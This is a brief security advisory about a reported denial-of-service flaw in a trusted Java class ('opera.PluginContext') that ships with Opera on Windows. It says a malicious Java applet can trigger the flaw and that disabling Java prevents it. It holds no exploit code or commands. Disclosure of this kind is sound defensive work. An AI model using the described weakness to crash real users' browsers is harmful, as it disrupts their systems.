Opera ships with a trusted Java class ('opera.PluginContext') that includes a native method that is reportedly prone to denial of service attacks. It is possible for a malicious Java applet to trigger this condition to cause a denial of service. This issue was reported in versions of Opera for Microsoft Windows operating systems. It is not known if other platforms are also affected. Java support must enabled for this issue to be present and can be disabled to prevent attacks.
